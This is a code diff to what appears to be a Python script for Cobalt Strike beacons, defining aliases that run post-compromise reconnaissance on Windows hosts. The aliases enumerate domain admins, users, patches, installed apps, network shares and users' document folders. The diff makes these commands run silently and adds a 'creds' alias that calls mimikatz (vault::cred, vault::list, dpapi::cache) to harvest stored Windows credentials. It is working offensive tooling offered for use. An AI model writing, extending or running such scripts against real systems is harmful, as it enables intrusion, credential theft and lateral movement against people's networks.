@@ -36,7 +36,20 @@ def _(bid):
     aggressor.bnet(bid, 'logons')
     aggressor.bnet(bid, 'sessions')
 
-    aggressor.bpowerpick(bid, command)
+    aggressor.btask(bid, 'Tasked beacon to perform basic recon')
+    aggressor.bpowerpick(bid, command, silent=True)
+
+@aliases.alias('env', 'Get environmental variables')
+def _(bid):
+    command = textwrap.dedent(r"""
+        Get-Childitem -path env:* |
+            Select-Object Name, Value |
+            Sort-Object name |
+            Format-Table -Auto
+        """)
+
+    aggressor.btask(bid, 'Tasked beacon to get environmental variables')
+    aggressor.bpowerpick(bid, command, silent=True)
 
 @aliases.alias('network', 'Perform some basic network-related recon')
 def _(bid):
@@ -51,43 +64,47 @@ def _(bid):
         nslookup myip.opendns.com. resolver1.opendns.com
         """)
 
-    aggressor.bpowerpick(bid, command)
+    aggressor.btask(bid, 'Tasked beacon to perform basic network recon')
+    aggressor.bpowerpick(bid, command, silent=True)
 
 @aliases.alias('wanip', 'Get WAN IP (or WAN IP of the outgoing DNS server)')
 def _(bid):
-    aggressor.bshell(bid, 'nslookup myip.opendns.com. resolver1.opendns.com')
+    aggressor.btask(bid, 'Tasked beacon to get WANIP')
+    aggressor.bshell(bid, 'nslookup myip.opendns.com. resolver1.opendns.com', silent=True)
 
 @aliases.alias('wanip-dns', 'Get WAN IP with DNS')
 def _(bid):
-    aggressor.bshell(bid, 'nslookup myip.opendns.com. resolver1.opendns.com')
-
+    aggressor.btask(bid, 'Tasked beacon to get WANIP via DNS')
+    aggressor.bshell(bid, 'nslookup myip.opendns.com. resolver1.opendns.com', silent=True)
 
 @aliases.alias('patches', 'Get list of patches on system')
 def _(bid):
-    command = """
-wmic os get Caption /value | more
-wmic qfe
-"""
+    command = textwrap.dedent("""
+        wmic os get Caption /value | more
+        wmic qfe
+        """)
 
-    aggressor.bpowerpick(bid, command)
+    aggressor.btask(bid, 'Tasked beacon to get patch status')
+    aggressor.bpowerpick(bid, command, silent=True)
 
 @aliases.alias('domain', 'Get basic domain info')
 def _(bid):
     command = textwrap.dedent(r"""
         echo "--- Domain ---"
         echo "$env:logonserver"
+
         echo "--- Domain admins ---"
         net group "domain admins" /domain
+
         echo "--- Local admins ---"
         net localgroup administrators
 
         echo "--- Exchange ---"
         net group "Exchange Trusted Subsystem" /domain 2>$null
-
-        echo "--- Domain trusts ---"
         """)
 
-    aggressor.bpowerpick(bid, command)
+    aggressor.btask(bid, 'Tasked beacon to perform basic domain recon')
+    aggressor.bpowerpick(bid, command, silent=True)
 
     aggressor.bnet(bid, 'dclist')
     aggressor.bnet(bid, 'domain_trusts')
@@ -102,19 +119,24 @@ def _(bid):
     command = textwrap.dedent("""
         echo "--- Domain ---"
         echo $env:logonserver
+
         echo "--- Domain users ---"
         net user /domain
+
         echo "--- Domain groups ---"
         net groups /domain
+
         echo "--- Domain accounts ---"
         net accounts /domain
         """)
 
-    aggressor.bpowerpick(bid, command)
+    aggressor.btask(bid, 'Tasked beacon to enumerate domain info')
+    aggressor.bpowerpick(bid, command, silent=True)
 
 @aliases.alias('apps', 'Get list of installed applications')
 def _(bid):
-    aggressor.bshell(bid, 'wmic product get Name,Version,Description')
+    aggressor.btask(bid, 'Tasked beacon to get list of applications')
+    aggressor.bshell(bid, 'wmic product get Name,Version,Description', silent=True)
 
 @aliases.alias('uninstallers', 'Get list of app uninstallers')
 def _(bid):
@@ -125,7 +147,8 @@ def _(bid):
         Format-Table -AutoSize
         """)
 
-    aggressor.bpowerpick(bid, command)
+    aggressor.btask(bid, 'Tasked beacon to get list of uninstallers')
+    aggressor.bpowerpick(bid, command, silent=True)
 
 @aliases.alias('appdata', 'List folders in Local and Roaming AppData')
 def _(bid):
@@ -134,18 +157,20 @@ def _(bid):
         ls $env:appdata
         """)
 
-    aggressor.bpowerpick(bid, command)
+    aggressor.btask(bid, 'Tasked beacon to show AppData')
+    aggressor.bpowerpick(bid, command, silent=True)
 
 @aliases.alias('docs', 'List common document folders')
 def _(bid):
     command = ''
 
-    for d in ['Desktop', 'Documents', 'Downloads']:
+    for d in ['Desktop', 'Documents', 'Downloads', 'Favorites']:
         command += 'ls $env:userprofile\\{}\n'.format(d)
 
-    aggressor.bpowerpick(bid, command)
+    aggressor.btask(bid, 'Tasked beacon to show common document folders')
+    aggressor.bpowerpick(bid, command, silent=True)
 
-@aliases.alias('show-shares', 'Show shares on a host')
+@aliases.alias('shares', 'Show shares on a host')
 def _(bid, *hosts):
     if not hosts:
         hosts = ['localhost']
@@ -157,7 +182,8 @@ def _(bid, *hosts):
 
         command += 'net view /all "{}";\n'.format(host)
 
-    aggressor.bpowerpick(bid, command)
+    aggressor.btask(bid, 'Tasked beacon to show shares on {}'.format(', '.join(hosts)))
+    aggressor.bpowerpick(bid, command, silent=True)
 
 @aliases.alias('list-shares', 'Run ls in each share on a host')
 def _(bid, *hosts):
@@ -178,6 +204,13 @@ def _(bid, *hosts):
             }};
             """.format(host=host))
 
-    aggressor.bpowerpick(bid, command)
+    aggressor.btask(bid, 'Tasked beacon to list files in shares on {}'.format(', '.join(hosts)))
+    aggressor.bpowerpick(bid, command, silent=True)
+
+@aliases.alias('creds', 'Grab WCM credentials and DPAPI cache')
+def _(bid):
+    aggressor.bmimikatz(bid, r'vault::cred')
+    aggressor.bmimikatz(bid, r'vault::list')
+    aggressor.bmimikatz(bid, r'dpapi::cache')
 
 engine.loop()
